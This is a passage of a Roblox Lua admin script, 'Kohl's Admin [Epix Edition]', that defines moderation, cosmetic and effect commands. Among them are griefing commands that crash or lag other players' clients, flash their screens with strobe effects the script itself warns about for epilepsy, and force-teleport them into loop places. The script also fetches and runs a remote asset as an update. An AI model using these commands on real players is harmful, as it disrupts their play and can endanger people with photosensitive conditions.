for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
set.Remote(v,'Function','Effect','flashify')
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s) look like a noob',-1,set.Prefix,{'noobify','noob'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Noobify(v.Character)
end
end)()
end
end)
 
set.MakeCommand('Turn the target player(s) into a ghost',-1,set.Prefix,{'ghostify','ghost'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
set.Remote(v,'Function','Noclip','norm')
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s) look like gold',-1,set.Prefix,{'goldify','gold'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s)\'s character shiney',-1,set.Prefix,{'shiney','shineify','shine'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)
 
set.MakeCommand('Make the target player(s) look normal',-1,set.Prefix,{'normal','normalify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
for a, sc in pairs(parent:children()) do if sc.Name == set.GuiName.."ify" or sc.Name==set.GuiName..'Glitch' or sc.Name == set.GuiName.."KohlsPoison" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do
if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
if prt.Name == 'HumanoidRootPart' then prt.Transparency=1 end
elseif prt:findFirstChild("NameTag") then
        prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
elseif prt.Name=='Kohls Puke' or prt.Name=='Kohls Bleed' then
        prt:Destroy()
elseif prt.Name==v.Name..'kohlscrusify' then
        set.RunCommand('refresh',v.Name)
end
end
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s)\'s screen rapidly change colors',-1,set.Prefix,{'trippy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','trippy')
end
end)
 
set.MakeCommand('Removes any effects on the target player(s)',-1,set.Prefix,{'uneffect','uneffectgui','unblind','unstrobe','untrippy','undance','unflashify','unrainbowify','guifix','fixgui'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        set.Remote(v,'Function','Effect','off')
end
end)
 
set.MakeCommand('Reverses the effects of the iceskate/slip command',-1,set.Prefix,{'unslip','unslippery','uniceskate'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Effect','unslip')
end
end)
 
set.MakeCommand('Makes the target player(s)\'s screen flash rapidly',-1,set.Prefix,{'strobe'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','strobe')
end
end)
 
set.MakeCommand('Blinds the target player(s)',-1,set.Prefix,{'blind'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','blind')
end
end)
 
set.MakeCommand('Loop heals the target player(s)',2,set.Prefix,{'loopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','loopheal')
end
end)
 
set.MakeCommand('UnLoop Heal',2,set.Prefix,{'unloopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
        set.Remote(v,'Function','Effect','unloopheal')
end
end)
 
set.MakeCommand('Loop flings the target player(s)',-1,set.Prefix,{'loopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
        set.Remote(v,'Function','Effect','loopfling')
end
end)
 
set.MakeCommand('UnLoop Fling',-1,set.Prefix,{'unloopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
        set.Remote(v,'Function','Effect','unloopfling')
end
end)
 
-------------------------
-- True Owner Commands --
-------------------------
set.MakeCommand('Force the target player(s) to teleport to the desired place',5,set.Prefix,{'forceplace'},{'player','placeid'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
game:GetService('TeleportService'):Teleport(args[2],v)
end)()
end
end)
 
set.MakeCommand('Force the script to update, buggy',5,set.Prefix,{'!updatekohls!'},{},1,function(plr,args)
local m=Instance.new('Message',workspace)
m.Text="Updating Kohl's Admin [Epix Edition] [MANUAL MODE]"
local mo=game:GetService('InsertService'):LoadAsset(145629584)
local news=mo:children()[1]
_G["Kohls Admin [Epix Edit] Update"]=set
news.Parent=game:service('ServerScriptService')
mo:Destroy()
wait(1)
m.Text='Breaking old version and respawning players...'
wait(1)
m:Destroy()
set=nil
RemoteEvent:Destroy()
script.Parent=nil
script.Disabled=true
script:Destroy()
for i,v in pairs(game:service('Players'):GetPlayers()) do
        v:LoadCharacter()
end
error('Breaking Old Version')
end)
 
set.MakeCommand('Ban the target player(s) forever',5,set.Prefix,{'permban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(plr,'Function','PromptPermBan',v)
end
end)
 
set.MakeCommand('View and change settings',5,set.Prefix,{'settings'},{},0,function(plr,args)
for i,v in pairs(UpdatableSettings) do
        if set[v]~=nil then set.Remote(plr,'SetSetting',v,set[v]) end
end
set.Remote(plr,'SetSetting','UpdatableSettings',UpdatableSettings)
wait(1)
set.Remote(plr,'Function','Settings')
end)
 
set.MakeCommand('Change command permissions',5,set.Prefix,{'perms','permissions','comperms'},{set.Prefix..'cmd','all/donor/temp/admin/owner/creator'},2,function(plr,args)
        local level=nil
        if args[2]:lower()=='all' or args[2]:lower()=='0' then
                level=0
        elseif args[2]:lower()=='donor' or args[2]:lower()=='1' then
                level=1
        elseif args[2]:lower()=='temp' or args[2]:lower()=='2' then
                level=2
        elseif args[2]:lower()=='admin' or args[2]:lower()=='3' then
                level=3
        elseif args[2]:lower()=='owner' or args[2]:lower()=='4' then
                level=4
        elseif args[2]:lower()=='creator' or args[2]:lower()=='5' then
                level=5
        elseif args[2]:lower()=='funtemp' or args[2]:lower()=='-1' then
                level=-1
        elseif args[2]:lower()=='funadmin' or args[2]:lower()=='-2' then
                level=-2
        elseif args[2]:lower()=='funowner' or args[2]:lower()=='-3' then
                level=-3
        end
        if level~=nil then
                for i=1,#set.Commands do
                        if args[1]:lower()==set.Commands[i].Prefix..set.Commands[i].Cmds[1]:lower() then        
                                set.Commands[i].AdminLevel=level
                        end
                end
        else
                set.OutputGui(plr,'Command Error:','Invalid Permission')
        end
end)
 
set.MakeCommand('Restore the map to the the way it was the last time it was backed up',3,set.Prefix,{'restoremap','maprestore','rmap'},{},0,function(plr,args)
        set.Hint('Restoring Map...',game:service('Players'):children())
        wait(0.5)
        for i,v in pairs(workspace:children()) do
                coroutine.wrap(function()
                        if v~=script and v.Archivable==true and not v:IsA('Terrain') then
                                pcall(function() v:Destroy() end)
                        end
                end)()
        end
        for i,v in pairs(set.MapBackup:children()) do
                coroutine.wrap(function()
                        v:Clone().Parent=workspace
                end)()
        end
        wait(1)
        set.ProcessCommand(plr,set.Prefix.."respawn"..set.SplitKey..set.SpecialPrefix.."all")
        wait(1)
        set.Hint('Map Restore Complete.',game:service('Players'):children())
end)
 
--------------------
-- Owner Commands --
--------------------
 
set.MakeCommand('Changes the backup for the restore map command to the map\'s current state',4,set.Prefix,{'backupmap','mapbackup','bmap'},{},0,function(plr,args)
        set.Hint('Updating Map Backup...',{plr})
        local tempmodel=Instance.new('Model')
        for i,v in pairs(workspace:children()) do
                if v and not v:IsA('Terrain') and v.Archivable==true and v~=script and v~=RemoteEvent then
                        v:Clone().Parent=tempmodel
                end
        end
        set.MapBackup=tempmodel:Clone()
        tempmodel:Destroy()
        set.Hint('Backup Complete',{plr})
end)
 
set.MakeCommand('Lets you explore the game, kinda like a file browser',4,set.Prefix,{'explore','explorer'},{},0,function(plr,args)
set.Remote(plr,'Function','Explorer')
end)
 
set.MakeCommand('Makes a tornado on the target player(s)',4,set.Prefix,{'tornado','twister'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
                local p=Instance.new('Part',workspace)
                local s=Instance.new('Smoke',p)
                s.RiseVelocity=25
                s.Size=50
                p.Transparency=1
                s.Color=Color3.new(0,0,0)
                --local a,b,c=s:clone(),s:clone(),s:clone()
                --a.Parent=p b.Parent=p c.Parent=p
                local pos=v.Character.Torso.CFrame+Vector3.new(0,-3,0)
                p.CFrame=pos
                p.Size=Vector3.new(0.2,0.2,0.2)
                p.Anchored=true
                p.CanCollide=false
                local childList={}
                local function checkObject(obj)
                        if (obj ~= p) and (obj.className == "Part") then
                                --if (obj.Anchored ~= false) then obj.Anchored=false end
                                        table.insert(childList, 1, obj)
                                --end
                        elseif (obj.className == "Model") or (obj.className == "Hat") or (obj.className == "Tool") or (obj == workspace) then
                                local child = obj:GetChildren()
                                for x = 1, #child do
                                        checkObject(child[x])
                                end
                                obj.ChildAdded:connect(checkObject)
                        end
                end
                checkObject(workspace)
                        local massConstant = 5
                        local mass = 3200 * massConstant
                        local n = 0
                        coroutine.wrap(function()
                        while p.Parent==workspace do
                                if n < #childList then
                                        n = n + 1
                                        if n % 800 == 0 then
                                                wait()
                                        end
                                else
                                        n = 1
                                        wait()
                                end
                       
                                local child = childList[n]
                                if (child ~= p) and (child.className == "Part") and (child.Anchored == false) then
                                        local relPos = p.Position - child.Position
                                        local motivator = child:FindFirstChild("BlackHole Influence")
                                        if relPos.magnitude * 240 * massConstant < mass then
                                                child:BreakJoints()
                                                if (relPos.magnitude * 320 * massConstant < mass) and (child.Size.z + p.Size.x >  relPos.magnitude * 2 - 4) then
                                                        mass = mass + child:GetMass()
                                                        child:Remove()
                                                        table.remove(childList, n)
                                                        n = n - 1
                                                else
                                                        child.CanCollide = false
                                                        if motivator == nil then
                                                                motivator = Instance.new("BodyPosition")
                                                                motivator.Parent = child
                                                                motivator.Name = "BlackHole Influence"
                                                        end
                                                        motivator.position = p.Position
                                                        motivator.maxForce = Vector3.new(1, 1, 1) * mass * child:GetMass() / (relPos.magnitude * massConstant)
                                                end
                                        elseif motivator ~= nil then
                                                motivator:Remove()
                                        end
                                end
                        end
                        end)()
                coroutine.wrap(function() wait(30) p:Destroy() end)()
                local posi=p.Position
                repeat
                        p.CFrame = p.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
                wait()
                until p.Parent~=workspace or not p
        end
end)
 
set.MakeCommand('Nuke the target player(s)',4,set.Prefix,{'nuke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p = Instance.new("Part",game.Workspace) table.insert(set.objects,p)
p.Anchored = true
p.CanCollide = false
p.formFactor = "Symmetric"
p.Shape = "Ball"
p.Size = Vector3.new(1,1,1)
p.BrickColor = BrickColor.new("New Yeller")
p.Transparency = .5
p.Reflectance = .2
p.TopSurface = 0
p.BottomSurface = 0
local ex = Instance.new("Explosion", workspace)
ex.Position = p.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
ex.Hit:connect(function(hit)
if hit:IsA('Part') and hit~=p then hit.Anchored=false end
hit:BreakJoints()
end)
p.Touched:connect(function(hit)
if hit and hit.Parent then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = hit.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
if hit:IsA('Part') then hit.Anchored=false end
hit:BreakJoints()
end
end)
local cf = v.Character.Torso.CFrame
p.CFrame = cf
for i = 1, 333 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = cf
wait(1/44)
end
p:Destroy()
end
end))
end
end)
 
--------------------------
-- Super Admin Commands --
--------------------------
 
set.MakeCommand('View server log',5,set.Prefix,{'serverlog','serverlogs','serveroutput','logsfordebug','debuglogs'},{'messagetype/all'},1,function(plr,args)
        local temp={}
        for i,v in pairs(game.LogService:GetLogHistory()) do
                if (args[1] and args[1]:lower()=='script') and v.message:find('Epix Edit') then
                        if v.messageType==Enum.MessageType.MessageOutput then
                                table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
                        elseif v.messageType==Enum.MessageType.MessageWarning then
                                table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
                        elseif v.messageType==Enum.MessageType.MessageInfo then
                                table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
                        elseif v.messageType==Enum.MessageType.MessageError then
                                table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
                        end
                else
                if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
                        table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
                end
                if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
                        table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
                end
                if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
                        table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
                end
                if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
                        table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
                end
                end
        end
        set.Remote(plr,'Function','ListGui','Server Log',temp,'serverlogstuff-'..(args[1] or 'all'),1300)
end)
 
set.MakeCommand('View the admin logs for the server',5,set.Prefix,{'logs','log','commandlogs'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Admin) do
        table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Admin Logs',temp,'adminlogslist')
end)
 
set.MakeCommand('Displays the current chat logs for the server',2,set.Prefix,{'chatlogs','chatlog'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Chat) do
        if m.Nil then
                table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
        else
                table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
        end
end
set.Remote(plr,'Function','ListGui','Chat Logs',temp,'chatlogslist')
end)
 
set.MakeCommand('View the exploit logs for the server OR a specific player',2,set.Prefix,{'exploitlogs','exploitlog','sploitlogs','detections'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Exploit) do
        table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Info,Desc=m.Info})
end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Exploit Logs',temp,'exploitlogslist')
end)
 
set.MakeCommand('Lets you run code on the server',3,set.Prefix,{'s','scr','script'},{'code'},1,function(plr,args)
if set.canuseloadstring then
set.Output(args[1], plr)
set.LoadScript('Script',args[1],set.AssignName(),true,game:service('ServerScriptService'))
else
set.Hint('LoadStringEnabled is set to false! If you are the place owner read the Important section at the top of the script to learn how to fix this!',{plr})
end
end)
 
set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run code as a local script',3,set.Prefix,{'ls','lscr','localscript'},{'code'},1,function(plr,args)
--if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(plr,args[1],true,set.AssignName())
set.Output(args[1], plr)
end)
 
set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run local scripts on the target player(s)',3,set.Prefix,{'cs','cscr','clientscript'},{'player','code'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i,v in pairs(plrz) do
if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(v,args[2],true,set.AssignName())
set.Output(args[2], plr)
end
end)
 
set.MakeCommand('Makes it so the target player(s) can\'t talk',3,set.Prefix,{'mute','silence'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then  
                        set.Remote(v,'Function','MutePlayer','on')
                        table.insert(set.MuteList,v.Name)
                end
        end
end)
 
set.MakeCommand('Makes it so the target player(s) can talk again',3,set.Prefix,{'unmute'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
for k,m in pairs(set.MuteList) do
if v.Name==m then
        table.remove(set.MuteList,k)
        set.Remote(v,'Function','MutePlayer','off')
end
end
end)()
end
end)
 
set.MakeCommand('Shows a list of currently muted players, like a ban list, but for mutes instead of bans',3,set.Prefix,{'mutelist','mutes','muted'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','MuteList',set['MuteList'])
set.Remote(plr,'Function','ListGui','Mute List',set.MuteList)
end)
 
set.MakeCommand('Tells the target player(s) they are not allowed to talk if they do and eventually kicks them',3,set.Prefix,{'notalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if not v:FindFirstChild('NoTalk') and not set.CheckAdmin(v,false) then
        local talky=Instance.new('IntValue',v)
        talky.Name='NoTalk'
        talky.Value=0
end
end)()
end
end)
 
set.MakeCommand('Un-NoTalk',3,set.Prefix,{'unnotalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function()
coroutine.wrap(function()
if v and v:FindFirstChild('NoTalk') then
        v.NoTalk:Destroy()
end
end)()
end)
end
end)
       
set.MakeCommand('Loop kills the target player(s)',3,set.Prefix,{'loopkill'},{'player','num(optional)'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 9999
if args[2] then if type(tonumber(args[2])) == "number" then num = tonumber(args[2]) end end
for i,v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false)  then
set.Remote(v,'Function','Effect','loopkill',num)
end
end
end)
 
set.MakeCommand('Makes a note on the target player(s) that says <note>',3,set.Prefix,{'note','writenote','makenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if not notes then
        notes=Instance.new('Model')
end
notes.Name='Admin Notes'
local note = Instance.new("StringValue", notes)
note.Name = args[2]
set.Hint('Added '..v.Name..' Note '..note.Name,{plr})
v:SaveInstance("Admin Notes", notes)
end
end
end)
 
set.MakeCommand('Removes a note on the target player(s)',3,set.Prefix,{'removenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if notes then
if args[2]:lower() == "all" then
        notes:ClearAllChildren()
else
        for k,m in pairs(notes:children()) do
        if m.Name:lower():sub(1,#args[2]) == args[2]:lower() then
                set.Hint('Removed '..v.Name..' Note '..m.Name,{plr})
                m:Destroy()
        end
end
end
v:SaveInstance("Admin Notes", notes)
end
end
end
end)
 
set.MakeCommand('Views notes on the target player(s)',3,set.Prefix,{'notes','viewnotes'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
local temptable={}
local notes=v:LoadInstance('Admin Notes')
if not notes then set.Hint('No notes on '..v.Name,{plr}) return end
for k,m in pairs(notes:children()) do
table.insert(temptable,m.Name)
--set.Remote(plr,'SetSetting',v.Name..'notes',temptable)
set.Remote(plr,'Function','ListGui',v.Name,temptable)
end
end
end)
 
set.MakeCommand('Un-Loop Kill',3,set.Prefix,{'unloopkill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
        set.Remote(v,'Function','Effect','unloopkill')
end
end)
 
set.MakeCommand('Locks the server, makes it so only admins and people on the excluded list can join',3,set.Prefix,{'slock','serverlock'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
        set.slock=true
        set.Hint("Server has been locked", game:service('Players'):children())
elseif args[1]:lower()=='off' then
        set.slock = false
        set.Hint("Server has been unlocked", game:service('Players'):children())
end
end)
 
set.MakeCommand('Locks the server, makes it so only people in the group that is set in the group settings can join',3,set.Prefix,{'glock','grouplock','grouponlyjoin'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
        set['GroupOnlyJoin'] = true
        set.Hint("Server is now Group Only.", game:service('Players'):children())
elseif args[1]:lower()=='off' then
        set['GroupOnlyJoin'] = false
        set.Hint("Server is no longer Group Only", game:service('Players'):children())
end
end)
 
set.MakeCommand('Same as message but says SYSTEM MESSAGE instead of your name',3,set.Prefix,{'sm','systemmessage'},{'message'},1,function(plr,args)
        set.Message("SYSTEM MESSAGE", args[1], false, game:service('Players'):children())
end)
 
set.MakeCommand('Kills the target player(s) <number> times giving you <number> KOs',3,set.Prefix,{'ko'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 500 if num > tonumber(args[2]) then num = tonumber(args[2]) end
for i, v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
set.LoadScript("Script",[[
v=game:service('Players'):FindFirstChild(']]..v.Name..[[')
for n = 1, ]]..num..[[ do
wait()
coroutine.wrap(function()
pcall(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = game:service('Players'):FindFirstChild("]]..plr.Name..[[") val.Name = "creator"
v.Character:BreakJoints()
wait()
v:LoadCharacter()
end
end)
end)()
end]],set.AssignName(),true,game:service("ServerScriptService"))
end
end
end)
 
set.MakeCommand('Makes the target player(s)\'s FPS drop',3,set.Prefix,{'lag','fpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','Lag')
end
end)()
end
end)
 
set.MakeCommand('Un-Lag',3,set.Prefix,{'unlag','unfpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','UnLag')
end
end)()
end
end)
 
set.MakeCommand('Bit buggy, supposed to make the target player(s) have network lag, instead produces some other interesting effects',3,set.Prefix,{'netlag','networklag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','NetLag')
end
end)()
end
end)
 
set.MakeCommand('Teleports players to my Trolololo place, which teleports them to the same place on-join',3,set.Prefix,{'telespam'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(154636492,v)
end
end)()
end
end)
 
set.MakeCommand('Sends players to my Fun Box place, gives bad headaches and such, please don\'t use on people with epilepsy',3,set.Prefix,{'funbox','trollbox','trololo'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(168920853,v)
end
end)()
end
end)
 
set.MakeCommand('Crashed the target player(s), has a high chance of crashing anyone with 4gbs of ram or lower',3,set.Prefix,{'crash'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
        set.Remote(v,'Function','Crash')
end
end
end)
 
set.MakeCommand('Makes it so the target player(s)\'s cam can move around freely',2,set.Prefix,{'freecam'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
                v.Character.Archivable=true
                local newchar=v.Character:clone()
                newchar.Parent=set.Storage
                v.Character=nil
        end
end)
 
set.MakeCommand('UnFree Cam',2,set.Prefix,{'unfreecam'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
                local newchar
                for k,m in pairs(set.Storage:children()) do
                        if m.Name==v.Name and m:IsA('Model') and m:FindFirstChild('Humanoid') and m:FindFirstChild('Head') then
                                m.Parent=workspace
                                m:MakeJoints()
                                v.Character=m
                                set.Remote(v,'Function','SetView',v.Character.Humanoid)
                        end
                end
        end
end)
 
